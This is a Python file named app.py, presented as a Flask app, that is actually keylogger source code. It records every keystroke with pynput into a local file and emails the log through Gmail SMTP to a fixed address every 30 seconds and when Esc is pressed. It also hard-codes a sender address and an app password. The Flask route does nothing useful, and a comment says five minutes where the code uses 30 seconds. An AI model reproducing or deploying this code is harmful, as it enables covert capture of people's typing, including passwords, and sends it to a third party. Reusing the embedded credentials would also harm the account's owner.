# app.py
from flask import Flask
import smtplib
import threading
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput import keyboard

app = Flask(__name__)
log_file = "keylog.txt"
@app.route('/')
def run_script():
   log_file = "keylog.txt"
email_sender = "k.sathyam2003@gmail.com"
email_password = "bgyo numg drov eqho"
email_receiver = "k.pandu2003@gmail.com"
send_interval = 30  # Every 5 minutes

def send_email():
    try:
        with open(log_file, "r") as file:
            keylog_data = file.read()

        msg = MIMEMultipart()
        msg['From'] = email_sender
        msg['To'] = email_receiver
        msg['Subject'] = "Keylog Data"
        msg.attach(MIMEText(keylog_data, 'plain'))

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email_sender, email_password)
        server.sendmail(email_sender, email_receiver, msg.as_string())
        server.quit()

        print("Keylog sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Stopping keylogger...")
        send_email()
        return False

def send_periodically():
    while True:
        time.sleep(send_interval)
        send_email()

# Start email sender thread
threading.Thread(target=send_periodically, daemon=True).start()

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
